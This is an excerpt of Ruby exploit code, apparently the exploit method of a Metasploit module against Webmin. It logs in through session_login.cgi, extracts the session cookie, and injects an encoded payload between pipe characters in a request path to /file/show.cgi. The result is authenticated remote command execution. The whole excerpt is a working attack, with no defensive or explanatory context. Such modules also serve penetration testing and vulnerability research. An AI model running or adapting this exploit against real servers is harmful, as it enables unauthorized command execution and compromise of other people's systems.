def exploit

    peer = "#{rhost}:#{rport}"

    print_status("Attempting to login...")

    data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"

    res = send_request_cgi(
      {
        'method'  => 'POST',
        'uri'     => "/session_login.cgi",
        'cookie'  => "testing=1",
        'data'    => data
      }, 25)

    if res and res.code == 302 and res.get_cookies =~ /sid/
      session = res.get_cookies.scan(/sid\=(\w+)\;*/).flatten[0] || ''
      if session and not session.empty?
        print_good "Authentication successfully"
      else
        print_error "Authentication failed"
        return
      end
      print_good "Authentication successfully"
    else
      print_error "Authentication failed"
      return
    end

    print_status("Attempting to execute the payload...")

    command = payload.encoded

    res = send_request_cgi(
      {
        'uri'     => "/file/show.cgi/bin/#{rand_text_alphanumeric(rand(5) + 5)}|#{command}|",
        'cookie'  => "sid=#{session}"
      }, 25)


    if res and res.code == 200 and res.message =~ /Document follows/
      print_good "Payload executed successfully"
    else
      print_error "Error executing the payload"
      return
    end

  end
